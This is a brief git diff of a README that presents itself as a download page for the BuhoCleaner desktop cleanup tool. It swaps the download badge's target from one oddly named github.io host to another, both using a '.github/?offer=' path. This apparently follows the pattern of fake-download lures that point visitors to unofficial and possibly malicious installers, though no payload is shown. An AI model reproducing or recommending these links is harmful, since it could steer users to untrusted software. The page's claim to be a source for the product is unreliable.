@@ -1,6 +1,6 @@
 # BuhoCleaner Download — Desktop Cleanup & Optimization
 
-<a href="https://tools-git-app.github.io/.github/?offer=BuhoCleaner" target="_blank">
+<a href="https://app-hub-load.github.io/.github/?offer=BuhoCleaner" target="_blank">
   <img 
     src="https://img.shields.io/badge/BuhoCleaner%20GitHub-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF" 
     width="320" 
